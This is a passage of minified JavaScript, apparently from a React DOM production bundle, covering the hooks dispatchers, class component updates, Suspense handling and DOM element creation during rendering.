xf(n,i){var u=Gt();i=i===void 0?null:i;var c=u.memoizedState;return c!==null&&i!==null&&Hs(i,c[1])?c[0]:(n=n(),u.memoizedState=[n,i],n)}function Af(n,i,u){return(_r&21)===0?(n.baseState&&(n.baseState=!1,Nt=!0),n.memoizedState=u):(en(u,i)||(u=ed(),qe.lanes|=u,Sr|=u,n.baseState=!0),i)}function Ig(n,i){var u=ze;ze=u!==0&&4>u?u:4,n(!0);var c=Bs.transition;Bs.transition={};try{n(!1),i()}finally{ze=u,Bs.transition=c}}function Lf(){return Gt().memoizedState}function Ng(n,i,u){var c=Kn(n);if(u={lane:c,action:u,hasEagerState:!1,eagerState:null,next:null},kf(n))If(i,u);else if(u=rf(n,i,u,c),u!==null){var f=At();un(u,n,c,f),Nf(u,i,c)}}function vg(n,i,u){var c=Kn(n),f={lane:c,action:u,hasEagerState:!1,eagerState:null,next:null};if(kf(n))If(i,f);else{var m=n.alternate;if(n.lanes===0&&(m===null||m.lanes===0)&&(m=i.lastRenderedReducer,m!==null))try{var b=i.lastRenderedState,A=m(b,u);if(f.hasEagerState=!0,f.eagerState=A,en(A,b)){var N=i.interleaved;N===null?(f.next=f,Os(i)):(f.next=N.next,N.next=f),i.interleaved=f;return}}catch{}u=rf(n,i,f,c),u!==null&&(f=At(),un(u,n,c,f),Nf(u,i,c))}}function kf(n){var i=n.alternate;return n===qe||i!==null&&i===qe}function If(n,i){ta=vu=!0;var u=n.pending;u===null?i.next=i:(i.next=u.next,u.next=i),n.pending=i}function Nf(n,i,u){if((u&4194240)!==0){var c=i.lanes;c&=n.pendingLanes,u|=c,i.lanes=u,Go(n,u)}}var Pu={readContext:Xt,useCallback:Tt,useContext:Tt,useEffect:Tt,useImperativeHandle:Tt,useInsertionEffect:Tt,useLayoutEffect:Tt,useMemo:Tt,useReducer:Tt,useRef:Tt,useState:Tt,useDebugValue:Tt,useDeferredValue:Tt,useTransition:Tt,useMutableSource:Tt,useSyncExternalStore:Tt,useId:Tt,unstable_isNewReconciler:!1},Rg={readContext:Xt,useCallback:function(n,i){return pn().memoizedState=[n,i===void 0?null:i],n},useContext:Xt,useEffect:Tf,useImperativeHandle:function(n,i,u){return u=u!=null?u.concat([n]):null,Ru(4194308,4,Sf.bind(null,i,n),u)},useLayoutEffect:function(n,i){return Ru(4194308,4,n,i)},useInsertionEffect:function(n,i){return Ru(4,2,n,i)},useMemo:function(n,i){var u=pn();return i=i===void 0?null:i,n=n(),u.memoizedState=[n,i],n},useReducer:function(n,i,u){var c=pn();return i=u!==void 0?u(i):i,c.memoizedState=c.baseState=i,n={pending:null,interleaved:null,lanes:0,dispatch:null,lastRenderedReducer:n,lastRenderedState:i},c.queue=n,n=n.dispatch=Ng.bind(null,qe,n),[c.memoizedState,n]},useRef:function(n){var i=pn();return n={current:n},i.memoizedState=n},useState:gf,useDebugValue:Ys,useDeferredValue:function(n){return pn().memoizedState=n},useTransition:function(){var n=gf(!1),i=n[0];return n=Ig.bind(null,n[1]),pn().memoizedState=n,[i,n]},useMutableSource:function(){},useSyncExternalStore:function(n,i,u){var c=qe,f=pn();if(Ge){if(u===void 0)throw Error(r(407));u=u()}else{if(u=i(),lt===null)throw Error(r(349));(_r&30)!==0||df(c,i,u)}f.memoizedState=u;var m={value:u,getSnapshot:i};return f.queue=m,Tf(hf.bind(null,c,m,n),[n]),c.flags|=2048,ia(9,ff.bind(null,c,m,u,i),void 0,null),u},useId:function(){var n=pn(),i=lt.identifierPrefix;if(Ge){var u=An,c=xn;u=(c&~(1<<32-Zt(c)-1)).toString(32)+u,i=":"+i+"R"+u,u=na++,0<u&&(i+="H"+u.toString(32)),i+=":"}else u=kg++,i=":"+i+"r"+u.toString(32)+":";return n.memoizedState=i},unstable_isNewReconciler:!1},Og={readContext:Xt,useCallback:Cf,useContext:Xt,useEffect:Qs,useImperativeHandle:yf,useInsertionEffect:bf,useLayoutEffect:_f,useMemo:xf,useReducer:Ws,useRef:Ef,useState:function(){return Ws(ra)},useDebugValue:Ys,useDeferredValue:function(n){var i=Gt();return Af(i,at.memoizedState,n)},useTransition:function(){var n=Ws(ra)[0],i=Gt().memoizedState;return[n,i]},useMutableSource:lf,useSyncExternalStore:cf,useId:Lf,unstable_isNewReconciler:!1},Pg={readContext:Xt,useCallback:Cf,useContext:Xt,useEffect:Qs,useImperativeHandle:yf,useInsertionEffect:bf,useLayoutEffect:_f,useMemo:xf,useReducer:js,useRef:Ef,useState:function(){return js(ra)},useDebugValue:Ys,useDeferredValue:function(n){var i=Gt();return at===null?i.memoizedState=n:Af(i,at.memoizedState,n)},useTransition:function(){var n=js(ra)[0],i=Gt().memoizedState;return[n,i]},useMutableSource:lf,useSyncExternalStore:cf,useId:Lf,unstable_isNewReconciler:!1};function nn(n,i){if(n&&n.defaultProps){i=C({},i),n=n.defaultProps;for(var u in n)i[u]===void 0&&(i[u]=n[u]);return i}return i}function Xs(n,i,u,c){i=n.memoizedState,u=u(c,i),u=u==null?i:C({},i,u),n.memoizedState=u,n.lanes===0&&(n.updateQueue.baseState=u)}var wu={isMounted:function(n){return(n=n._reactInternals)?hr(n)===n:!1},enqueueSetState:function(n,i,u){n=n._reactInternals;var c=At(),f=Kn(n),m=kn(c,f);m.payload=i,u!=null&&(m.callback=u),i=Gn(n,m,f),i!==null&&(un(i,n,f,c),Lu(i,n,f))},enqueueReplaceState:function(n,i,u){n=n._reactInternals;var c=At(),f=Kn(n),m=kn(c,f);m.tag=1,m.payload=i,u!=null&&(m.callback=u),i=Gn(n,m,f),i!==null&&(un(i,n,f,c),Lu(i,n,f))},enqueueForceUpdate:function(n,i){n=n._reactInternals;var u=At(),c=Kn(n),f=kn(u,c);f.tag=2,i!=null&&(f.callback=i),i=Gn(n,f,c),i!==null&&(un(i,n,c,u),Lu(i,n,c))}};function vf(n,i,u,c,f,m,b){return n=n.stateNode,typeof n.shouldComponentUpdate=="function"?n.shouldComponentUpdate(c,m,b):i.prototype&&i.prototype.isPureReactComponent?!Qi(u,c)||!Qi(f,m):!0}function Rf(n,i,u){var c=!1,f=Qn,m=i.contextType;return typeof m=="object"&&m!==null?m=Xt(m):(f=It(i)?mr:Et.current,c=i.contextTypes,m=(c=c!=null)?$r(n,f):Qn),i=new i(u,m),n.memoizedState=i.state!==null&&i.state!==void 0?i.state:null,i.updater=wu,n.stateNode=i,i._reactInternals=n,c&&(n=n.stateNode,n.__reactInternalMemoizedUnmaskedChildContext=f,n.__reactInternalMemoizedMaskedChildContext=m),i}function Of(n,i,u,c){n=i.state,typeof i.componentWillReceiveProps=="function"&&i.componentWillReceiveProps(u,c),typeof i.UNSAFE_componentWillReceiveProps=="function"&&i.UNSAFE_componentWillReceiveProps(u,c),i.state!==n&&wu.enqueueReplaceState(i,i.state,null)}function Gs(n,i,u,c){var f=n.stateNode;f.props=u,f.state=n.memoizedState,f.refs={},Ps(n);var m=i.contextType;typeof m=="object"&&m!==null?f.context=Xt(m):(m=It(i)?mr:Et.current,f.context=$r(n,m)),f.state=n.memoizedState,m=i.getDerivedStateFromProps,typeof m=="function"&&(Xs(n,i,m,u),f.state=n.memoizedState),typeof i.getDerivedStateFromProps=="function"||typeof f.getSnapshotBeforeUpdate=="function"||typeof f.UNSAFE_componentWillMount!="function"&&typeof f.componentWillMount!="function"||(i=f.state,typeof f.componentWillMount=="function"&&f.componentWillMount(),typeof f.UNSAFE_componentWillMount=="function"&&f.UNSAFE_componentWillMount(),i!==f.state&&wu.enqueueReplaceState(f,f.state,null),ku(n,u,f,c),f.state=n.memoizedState),typeof f.componentDidMount=="function"&&(n.flags|=4194308)}function ri(n,i){try{var u="",c=i;do u+=Ne(c),c=c.return;while(c);var f=u}catch(m){f=`
Error generating stack: `+m.message+`
`+m.stack}return{value:n,source:i,stack:f,digest:null}}function Vs(n,i,u){return{value:n,source:null,stack:u??null,digest:i??null}}function $s(n,i){try{console.error(i.value)}catch(u){setTimeout(function(){throw u})}}var wg=typeof WeakMap=="function"?WeakMap:Map;function Pf(n,i,u){u=kn(-1,u),u.tag=3,u.payload={element:null};var c=i.value;return u.callback=function(){zu||(zu=!0,cl=c),$s(n,i)},u}function wf(n,i,u){u=kn(-1,u),u.tag=3;var c=n.type.getDerivedStateFromError;if(typeof c=="function"){var f=i.value;u.payload=function(){return c(f)},u.callback=function(){$s(n,i)}}var m=n.stateNode;return m!==null&&typeof m.componentDidCatch=="function"&&(u.callback=function(){$s(n,i),typeof c!="function"&&($n===null?$n=new Set([this]):$n.add(this));var b=i.stack;this.componentDidCatch(i.value,{componentStack:b!==null?b:""})}),u}function Df(n,i,u){var c=n.pingCache;if(c===null){c=n.pingCache=new wg;var f=new Set;c.set(i,f)}else f=c.get(i),f===void 0&&(f=new Set,c.set(i,f));f.has(u)||(f.add(u),n=Vg.bind(null,n,i,u),i.then(n,n))}function Mf(n){do{var i;if((i=n.tag===13)&&(i=n.memoizedState,i=i!==null?i.dehydrated!==null:!0),i)return n;n=n.return}while(n!==null);return null}function Ff(n,i,u,c,f){return(n.mode&1)===0?(n===i?n.flags|=65536:(n.flags|=128,u.flags|=131072,u.flags&=-52805,u.tag===1&&(u.alternate===null?u.tag=17:(i=kn(-1,1),i.tag=2,Gn(u,i,1))),u.lanes|=1),n):(n.flags|=65536,n.lanes=f,n)}var Dg=ie.ReactCurrentOwner,Nt=!1;function xt(n,i,u,c){i.child=n===null?nf(i,null,u,c):Zr(i,n.child,u,c)}function Bf(n,i,u,c,f){u=u.render;var m=i.ref;return ti(i,f),c=Us(n,i,u,c,m,f),u=zs(),n!==null&&!Nt?(i.updateQueue=n.updateQueue,i.flags&=-2053,n.lanes&=~f,In(n,i,f)):(Ge&&u&&Cs(i),i.flags|=1,xt(n,i,c,f),i.child)}function Hf(n,i,u,c,f){if(n===null){var m=u.type;return typeof m=="function"&&!El(m)&&m.defaultProps===void 0&&u.compare===null&&u.defaultProps===void 0?(i.tag=15,i.type=m,Uf(n,i,m,c,f)):(n=Gu(u.type,null,c,i,i.mode,f),n.ref=i.ref,n.return=i,i.child=n)}if(m=n.child,(n.lanes&f)===0){var b=m.memoizedProps;if(u=u.compare,u=u!==null?u:Qi,u(b,c)&&n.ref===i.ref)return In(n,i,f)}return i.flags|=1,n=Zn(m,c),n.ref=i.ref,n.return=i,i.child=n}function Uf(n,i,u,c,f){if(n!==null){var m=n.memoizedProps;if(Qi(m,c)&&n.ref===i.ref)if(Nt=!1,i.pendingProps=c=m,(n.lanes&f)!==0)(n.flags&131072)!==0&&(Nt=!0);else return i.lanes=n.lanes,In(n,i,f)}return qs(n,i,u,c,f)}function zf(n,i,u){var c=i.pendingProps,f=c.children,m=n!==null?n.memoizedState:null;if(c.mode==="hidden")if((i.mode&1)===0)i.memoizedState={baseLanes:0,cachePool:null,transitions:null},je(ai,Ut),Ut|=u;else{if((u&1073741824)===0)return n=m!==null?m.baseLanes|u:u,i.lanes=i.childLanes=1073741824,i.memoizedState={baseLanes:n,cachePool:null,transitions:null},i.updateQueue=null,je(ai,Ut),Ut|=n,null;i.memoizedState={baseLanes:0,cachePool:null,transitions:null},c=m!==null?m.baseLanes:u,je(ai,Ut),Ut|=c}else m!==null?(c=m.baseLanes|u,i.memoizedState=null):c=u,je(ai,Ut),Ut|=c;return xt(n,i,f,u),i.child}function Wf(n,i){var u=i.ref;(n===null&&u!==null||n!==null&&n.ref!==u)&&(i.flags|=512,i.flags|=2097152)}function qs(n,i,u,c,f){var m=It(u)?mr:Et.current;return m=$r(i,m),ti(i,f),u=Us(n,i,u,c,m,f),c=zs(),n!==null&&!Nt?(i.updateQueue=n.updateQueue,i.flags&=-2053,n.lanes&=~f,In(n,i,f)):(Ge&&c&&Cs(i),i.flags|=1,xt(n,i,u,f),i.child)}function jf(n,i,u,c,f){if(It(u)){var m=!0;Tu(i)}else m=!1;if(ti(i,f),i.stateNode===null)Mu(n,i),Rf(i,u,c),Gs(i,u,c,f),c=!0;else if(n===null){var b=i.stateNode,A=i.memoizedProps;b.props=A;var N=b.context,U=u.contextType;typeof U=="object"&&U!==null?U=Xt(U):(U=It(u)?mr:Et.current,U=$r(i,U));var $=u.getDerivedStateFromProps,q=typeof $=="function"||typeof b.getSnapshotBeforeUpdate=="function";q||typeof b.UNSAFE_componentWillReceiveProps!="function"&&typeof b.componentWillReceiveProps!="function"||(A!==c||N!==U)&&Of(i,b,c,U),Xn=!1;var G=i.memoizedState;b.state=G,ku(i,c,b,f),N=i.memoizedState,A!==c||G!==N||kt.current||Xn?(typeof $=="function"&&(Xs(i,u,$,c),N=i.memoizedState),(A=Xn||vf(i,u,A,c,G,N,U))?(q||typeof b.UNSAFE_componentWillMount!="function"&&typeof b.componentWillMount!="function"||(typeof b.componentWillMount=="function"&&b.componentWillMount(),typeof b.UNSAFE_componentWillMount=="function"&&b.UNSAFE_componentWillMount()),typeof b.componentDidMount=="function"&&(i.flags|=4194308)):(typeof b.componentDidMount=="function"&&(i.flags|=4194308),i.memoizedProps=c,i.memoizedState=N),b.props=c,b.state=N,b.context=U,c=A):(typeof b.componentDidMount=="function"&&(i.flags|=4194308),c=!1)}else{b=i.stateNode,af(n,i),A=i.memoizedProps,U=i.type===i.elementType?A:nn(i.type,A),b.props=U,q=i.pendingProps,G=b.context,N=u.contextType,typeof N=="object"&&N!==null?N=Xt(N):(N=It(u)?mr:Et.current,N=$r(i,N));var ae=u.getDerivedStateFromProps;($=typeof ae=="function"||typeof b.getSnapshotBeforeUpdate=="function")||typeof b.UNSAFE_componentWillReceiveProps!="function"&&typeof b.componentWillReceiveProps!="function"||(A!==q||G!==N)&&Of(i,b,c,N),Xn=!1,G=i.memoizedState,b.state=G,ku(i,c,b,f);var le=i.memoizedState;A!==q||G!==le||kt.current||Xn?(typeof ae=="function"&&(Xs(i,u,ae,c),le=i.memoizedState),(U=Xn||vf(i,u,U,c,G,le,N)||!1)?($||typeof b.UNSAFE_componentWillUpdate!="function"&&typeof b.componentWillUpdate!="function"||(typeof b.componentWillUpdate=="function"&&b.componentWillUpdate(c,le,N),typeof b.UNSAFE_componentWillUpdate=="function"&&b.UNSAFE_componentWillUpdate(c,le,N)),typeof b.componentDidUpdate=="function"&&(i.flags|=4),typeof b.getSnapshotBeforeUpdate=="function"&&(i.flags|=1024)):(typeof b.componentDidUpdate!="function"||A===n.memoizedProps&&G===n.memoizedState||(i.flags|=4),typeof b.getSnapshotBeforeUpdate!="function"||A===n.memoizedProps&&G===n.memoizedState||(i.flags|=1024),i.memoizedProps=c,i.memoizedState=le),b.props=c,b.state=le,b.context=N,c=U):(typeof b.componentDidUpdate!="function"||A===n.memoizedProps&&G===n.memoizedState||(i.flags|=4),typeof b.getSnapshotBeforeUpdate!="function"||A===n.memoizedProps&&G===n.memoizedState||(i.flags|=1024),c=!1)}return Ks(n,i,u,c,m,f)}function Ks(n,i,u,c,f,m){Wf(n,i);var b=(i.flags&128)!==0;if(!c&&!b)return f&&Gd(i,u,!1),In(n,i,m);c=i.stateNode,Dg.current=i;var A=b&&typeof u.getDerivedStateFromError!="function"?null:c.render();return i.flags|=1,n!==null&&b?(i.child=Zr(i,n.child,null,m),i.child=Zr(i,null,A,m)):xt(n,i,A,m),i.memoizedState=c.state,f&&Gd(i,u,!0),i.child}function Qf(n){var i=n.stateNode;i.pendingContext?Yd(n,i.pendingContext,i.pendingContext!==i.context):i.context&&Yd(n,i.context,!1),ws(n,i.containerInfo)}function Yf(n,i,u,c,f){return Jr(),ks(f),i.flags|=256,xt(n,i,u,c),i.child}var Js={dehydrated:null,treeContext:null,retryLane:0};function Zs(n){return{baseLanes:n,cachePool:null,transitions:null}}function Xf(n,i,u){var c=i.pendingProps,f=$e.current,m=!1,b=(i.flags&128)!==0,A;if((A=b)||(A=n!==null&&n.memoizedState===null?!1:(f&2)!==0),A?(m=!0,i.flags&=-129):(n===null||n.memoizedState!==null)&&(f|=1),je($e,f&1),n===null)return Ls(i),n=i.memoizedState,n!==null&&(n=n.dehydrated,n!==null)?((i.mode&1)===0?i.lanes=1:n.data==="$!"?i.lanes=8:i.lanes=1073741824,null):(b=c.children,n=c.fallback,m?(c=i.mode,m=i.child,b={mode:"hidden",children:b},(c&1)===0&&m!==null?(m.childLanes=0,m.pendingProps=b):m=Vu(b,c,0,null),n=Ar(n,c,u,null),m.return=i,n.return=i,m.sibling=n,i.child=m,i.child.memoizedState=Zs(u),i.memoizedState=Js,n):el(i,b));if(f=n.memoizedState,f!==null&&(A=f.dehydrated,A!==null))return Mg(n,i,b,c,A,f,u);if(m){m=c.fallback,b=i.mode,f=n.child,A=f.sibling;var N={mode:"hidden",children:c.children};return(b&1)===0&&i.child!==f?(c=i.child,c.childLanes=0,c.pendingProps=N,i.deletions=null):(c=Zn(f,N),c.subtreeFlags=f.subtreeFlags&14680064),A!==null?m=Zn(A,m):(m=Ar(m,b,u,null),m.flags|=2),m.return=i,c.return=i,c.sibling=m,i.child=c,c=m,m=i.child,b=n.child.memoizedState,b=b===null?Zs(u):{baseLanes:b.baseLanes|u,cachePool:null,transitions:b.transitions},m.memoizedState=b,m.childLanes=n.childLanes&~u,i.memoizedState=Js,c}return m=n.child,n=m.sibling,c=Zn(m,{mode:"visible",children:c.children}),(i.mode&1)===0&&(c.lanes=u),c.return=i,c.sibling=null,n!==null&&(u=i.deletions,u===null?(i.deletions=[n],i.flags|=16):u.push(n)),i.child=c,i.memoizedState=null,c}function el(n,i){return i=Vu({mode:"visible",children:i},n.mode,0,null),i.return=n,n.child=i}function Du(n,i,u,c){return c!==null&&ks(c),Zr(i,n.child,null,u),n=el(i,i.pendingProps.children),n.flags|=2,i.memoizedState=null,n}function Mg(n,i,u,c,f,m,b){if(u)return i.flags&256?(i.flags&=-257,c=Vs(Error(r(422))),Du(n,i,b,c)):i.memoizedState!==null?(i.child=n.child,i.flags|=128,null):(m=c.fallback,f=i.mode,c=Vu({mode:"visible",children:c.children},f,0,null),m=Ar(m,f,b,null),m.flags|=2,c.return=i,m.return=i,c.sibling=m,i.child=c,(i.mode&1)!==0&&Zr(i,n.child,null,b),i.child.memoizedState=Zs(b),i.memoizedState=Js,m);if((i.mode&1)===0)return Du(n,i,b,null);if(f.data==="$!"){if(c=f.nextSibling&&f.nextSibling.dataset,c)var A=c.dgst;return c=A,m=Error(r(419)),c=Vs(m,c,void 0),Du(n,i,b,c)}if(A=(b&n.childLanes)!==0,Nt||A){if(c=lt,c!==null){switch(b&-b){case 4:f=2;break;case 16:f=8;break;case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:f=32;break;case 536870912:f=268435456;break;default:f=0}f=(f&(c.suspendedLanes|b))!==0?0:f,f!==0&&f!==m.retryLane&&(m.retryLane=f,Ln(n,f),un(c,n,f,-1))}return gl(),c=Vs(Error(r(421))),Du(n,i,b,c)}return f.data==="$?"?(i.flags|=128,i.child=n.child,i=$g.bind(null,n),f._reactRetry=i,null):(n=m.treeContext,Ht=Wn(f.nextSibling),Bt=i,Ge=!0,tn=null,n!==null&&(Qt[Yt++]=xn,Qt[Yt++]=An,Qt[Yt++]=gr,xn=n.id,An=n.overflow,gr=i),i=el(i,c.children),i.flags|=4096,i)}function Gf(n,i,u){n.lanes|=i;var c=n.alternate;c!==null&&(c.lanes|=i),Rs(n.return,i,u)}function tl(n,i,u,c,f){var m=n.memoizedState;m===null?n.memoizedState={isBackwards:i,rendering:null,renderingStartTime:0,last:c,tail:u,tailMode:f}:(m.isBackwards=i,m.rendering=null,m.renderingStartTime=0,m.last=c,m.tail=u,m.tailMode=f)}function Vf(n,i,u){var c=i.pendingProps,f=c.revealOrder,m=c.tail;if(xt(n,i,c.children,u),c=$e.current,(c&2)!==0)c=c&1|2,i.flags|=128;else{if(n!==null&&(n.flags&128)!==0)e:for(n=i.child;n!==null;){if(n.tag===13)n.memoizedState!==null&&Gf(n,u,i);else if(n.tag===19)Gf(n,u,i);else if(n.child!==null){n.child.return=n,n=n.child;continue}if(n===i)break e;for(;n.sibling===null;){if(n.return===null||n.return===i)break e;n=n.return}n.sibling.return=n.return,n=n.sibling}c&=1}if(je($e,c),(i.mode&1)===0)i.memoizedState=null;else switch(f){case"forwards":for(u=i.child,f=null;u!==null;)n=u.alternate,n!==null&&Iu(n)===null&&(f=u),u=u.sibling;u=f,u===null?(f=i.child,i.child=null):(f=u.sibling,u.sibling=null),tl(i,!1,f,u,m);break;case"backwards":for(u=null,f=i.child,i.child=null;f!==null;){if(n=f.alternate,n!==null&&Iu(n)===null){i.child=f;break}n=f.sibling,f.sibling=u,u=f,f=n}tl(i,!0,u,null,m);break;case"together":tl(i,!1,null,null,void 0);break;default:i.memoizedState=null}return i.child}function Mu(n,i){(i.mode&1)===0&&n!==null&&(n.alternate=null,i.alternate=null,i.flags|=2)}function In(n,i,u){if(n!==null&&(i.dependencies=n.dependencies),Sr|=i.lanes,(u&i.childLanes)===0)return null;if(n!==null&&i.child!==n.child)throw Error(r(153));if(i.child!==null){for(n=i.child,u=Zn(n,n.pendingProps),i.child=u,u.return=i;n.sibling!==null;)n=n.sibling,u=u.sibling=Zn(n,n.pendingProps),u.return=i;u.sibling=null}return i.child}function Fg(n,i,u){switch(i.tag){case 3:Qf(i),Jr();break;case 5:sf(i);break;case 1:It(i.type)&&Tu(i);break;case 4:ws(i,i.stateNode.containerInfo);break;case 10:var c=i.type._context,f=i.memoizedProps.value;je(xu,c._currentValue),c._currentValue=f;break;case 13:if(c=i.memoizedState,c!==null)return c.dehydrated!==null?(je($e,$e.current&1),i.flags|=128,null):(u&i.child.childLanes)!==0?Xf(n,i,u):(je($e,$e.current&1),n=In(n,i,u),n!==null?n.sibling:null);je($e,$e.current&1);break;case 19:if(c=(u&i.childLanes)!==0,(n.flags&128)!==0){if(c)return Vf(n,i,u);i.flags|=128}if(f=i.memoizedState,f!==null&&(f.rendering=null,f.tail=null,f.lastEffect=null),je($e,$e.current),c)break;return null;case 22:case 23:return i.lanes=0,zf(n,i,u)}return In(n,i,u)}var $f,nl,qf,Kf;$f=function(n,i){for(var u=i.child;u!==null;){if(u.tag===5||u.tag===6)n.appendChild(u.stateNode);else if(u.tag!==4&&u.child!==null){u.child.return=u,u=u.child;continue}if(u===i)break;for(;u.sibling===null;){if(u.return===null||u.return===i)return;u=u.return}u.sibling.return=u.return,u=u.sibling}},nl=function(){},qf=function(n,i,u,c){var f=n.memoizedProps;if(f!==c){n=i.stateNode,br(hn.current);var m=null;switch(u){case"input":f=Ai(n,f),c=Ai(n,c),m=[];break;case"select":f=C({},f,{value:void 0}),c=C({},c,{value:void 0}),m=[];break;case"textarea":f=Ii(n,f),c=Ii(n,c),m=[];break;default:typeof f.onClick!="function"&&typeof c.onClick=="function"&&(n.onclick=mu)}pt(u,c);var b;u=null;for(U in f)if(!c.hasOwnProperty(U)&&f.hasOwnProperty(U)&&f[U]!=null)if(U==="style"){var A=f[U];for(b in A)A.hasOwnProperty(b)&&(u||(u={}),u[b]="")}else U!=="dangerouslySetInnerHTML"&&U!=="children"&&U!=="suppressContentEditableWarning"&&U!=="suppressHydrationWarning"&&U!=="autoFocus"&&(o.hasOwnProperty(U)?m||(m=[]):(m=m||[]).push(U,null));for(U in c){var N=c[U];if(A=f?.[U],c.hasOwnProperty(U)&&N!==A&&(N!=null||A!=null))if(U==="style")if(A){for(b in A)!A.hasOwnProperty(b)||N&&N.hasOwnProperty(b)||(u||(u={}),u[b]="");for(b in N)N.hasOwnProperty(b)&&A[b]!==N[b]&&(u||(u={}),u[b]=N[b])}else u||(m||(m=[]),m.push(U,u)),u=N;else U==="dangerouslySetInnerHTML"?(N=N?N.__html:void 0,A=A?A.__html:void 0,N!=null&&A!==N&&(m=m||[]).push(U,N)):U==="children"?typeof N!="string"&&typeof N!="number"||(m=m||[]).push(U,""+N):U!=="suppressContentEditableWarning"&&U!=="suppressHydrationWarning"&&(o.hasOwnProperty(U)?(N!=null&&U==="onScroll"&&Ye("scroll",n),m||A===N||(m=[])):(m=m||[]).push(U,N))}u&&(m=m||[]).push("style",u);var U=m;(i.updateQueue=U)&&(i.flags|=4)}},Kf=function(n,i,u,c){u!==c&&(i.flags|=4)};function aa(n,i){if(!Ge)switch(n.tailMode){case"hidden":i=n.tail;for(var u=null;i!==null;)i.alternate!==null&&(u=i),i=i.sibling;u===null?n.tail=null:u.sibling=null;break;case"collapsed":u=n.tail;for(var c=null;u!==null;)u.alternate!==null&&(c=u),u=u.sibling;c===null?i||n.tail===null?n.tail=null:n.tail.sibling=null:c.sibling=null}}function bt(n){var i=n.alternate!==null&&n.alternate.child===n.child,u=0,c=0;if(i)for(var f=n.child;f!==null;)u|=f.lanes|f.childLanes,c|=f.subtreeFlags&14680064,c|=f.flags&14680064,f.return=n,f=f.sibling;else for(f=n.child;f!==null;)u|=f.lanes|f.childLanes,c|=f.subtreeFlags,c|=f.flags,f.return=n,f=f.sibling;return n.subtreeFlags|=c,n.childLanes=u,i}function Bg(n,i,u){var c=i.pendingProps;switch(xs(i),i.tag){case 2:case 16:case 15:case 0:case 11:case 7:case 8:case 12:case 9:case 14:return bt(i),null;case 1:return It(i.type)&&Eu(),bt(i),null;case 3:return c=i.stateNode,ni(),Xe(kt),Xe(Et),Fs(),c.pendingContext&&(c.context=c.pendingContext,c.pendingContext=null),(n===null||n.child===null)&&(yu(i)?i.flags|=4:n===null||n.memoizedState.isDehydrated&&(i.flags&256)===0||(i.flags|=1024,tn!==null&&(hl(tn),tn=null))),nl(n,i),bt(i),null;case 5:Ds(i);var f=br(ea.current);if(u=i.type,n!==null&&i.stateNode!=null)qf(n,i,u,c,f),n.ref!==i.ref&&(i.flags|=512,i.flags|=2097152);else{if(!c){if(i.stateNode===null)throw Error(r(166));return bt(i),null}if(n=br(hn.current),yu(i)){c=i.stateNode,u=i.type;var m=i.memoizedProps;switch(c[fn]=i,c[$i]=m,n=(i.mode&1)!==0,u){case"dialog":Ye("cancel",c),Ye("close",c);break;case"iframe":case"object":case"embed":Ye("load",c);break;case"video":case"audio":for(f=0;f<Xi.length;f++)Ye(Xi[f],c);break;case"source":Ye("error",c);break;case"img":case"image":case"link":Ye("error",c),Ye("load",c);break;case"details":Ye("toggle",c);break;case"input":Li(c,m),Ye("invalid",c);break;case"select":c._wrapperState={wasMultiple:!!m.multiple},Ye("invalid",c);break;case"textarea":Ya(c,m),Ye("invalid",c)}pt(u,m),f=null;for(var b in m)if(m.hasOwnProperty(b)){var A=m[b];b==="children"?typeof A=="string"?c.textContent!==A&&(m.suppressHydrationWarning!==!0&&pu(c.textContent,A,n),f=["children",A]):typeof A=="number"&&c.textContent!==""+A&&(m.suppressHydrationWarning!==!0&&pu(c.textContent,A,n),f=["children",""+A]):o.hasOwnProperty(b)&&A!=null&&b==="onScroll"&&Ye("scroll",c)}switch(u){case"input":_n(c),Qa(c,m,!0);break;case"textarea":_n(c),Ga(c);break;case"select":case"option":break;default:typeof m.onClick=="function"&&(c.onclick=mu)}c=f,i.updateQueue=c,c!==null&&(i.flags|=4)}else{b=f.nodeType===9?f:f.ownerDocument,n==="http://www.w3.org/1999/xhtml"&&(n=Y(u)),n==="http://www.w3.org/1999/xhtml"?u==="script"?(n=b.createElement("div"),n.innerHTML="<script><\/script>",n=n.removeChild(n.firstChild)):typeof c.is=="string"?n=b.createElement(u,{is:c.is}):(n=b.createElement(u),u==="select"&&(b=n,c.multiple?b.multiple=!0:c.size&&(b.size=c.size))):n=b.createElementNS(n,u),n[fn]=i,n[$i]=c,$f(n,i,!1,!1),i.stateNode=n;e:{switch(b=cn(u,c),u){case"dialog":Ye("cancel",n),Ye("close",n),f=c;break;case"iframe":case"object":case"embed":Ye("load",n),f=c;break;case"video":case"audio":for(f=0;f<Xi.length;f++)Ye(Xi[f],n);f=c;break;case"source":Ye("error",n),f=c;break;case"img":case"image":case"link":Ye("error",n),Ye("load",n),f=c;break;case"details":Ye("toggle",n),f=c;break;case"input":Li(n,c),f=Ai(n,c),Ye("invalid",n);break;case"option":f=c;break;case"select":n._wrapperState={wasMultiple:!!c.multiple},f=C({},c,{value:void 0}),Ye("invalid",n);break;case"textarea":Ya(n,c),f=Ii(n,c),Ye("invalid",n);break;default:f=c}pt(u,f),A=f;for(m in A)if(A.hasOwnProperty(m)){var N=A[m];m==="style"?Dn(n,N):m==="dangerouslySetInnerHTML"?(N=N?N.__html:void 0,N!=null&&Re(n,N)):m==="children"?typeof N=="string"?(u!=="textarea"||N!=="")&&Me(n,N):typeof N=="number"&&Me(n,""+N):m!=="suppressContentEditableWarning"&&m!=="suppressHydrationWarning"&&m!=="autoFocus"&&(o.hasOwnProperty(m)?N!=null&&m==="onScroll"&&Ye("scroll",n):N!=null&&j(n,m,N,b))}switch(u){case"input":_n(n),Qa(n,c,!1);break;case"textarea":_n(n),Ga(n);break;case"option":c.value!=null&&n.setAttribute("value",""+ve(c.value));break;case"select":n.multiple=!!c.multiple,m=c.value,m!=null?wn(n,!!c.multiple,m,!1):c.defaultValue!=null&&wn(n,!!c.multiple,c.defaultValue,!0);break;default:typeof f.onClick=="function"&&(n.onclick=mu)}switch(u){case"button":case"input":case"select":case"textarea":c=!!c.autoFocus;break e;case"img":c=!0;break e;default:c=!1}}c&&(i.flags|=4)}i.ref!==null&&(i.flags|=512,i.flags|=2097152)}return bt(i),null;case 6:if(n&&i.stateNode!=null)Kf(n,i,n.memoizedProps,c);else{if(typeof c!="string"&&i.stateNode===null)throw Error(r(166));if(u=br(ea.current),br(hn.current),yu(i)){if(c=i.stateNode,u=i.memoizedProps,c[fn]=i,(m=c.nodeValue!==u)&&(n=Bt,n!==null))switch(n.tag){case 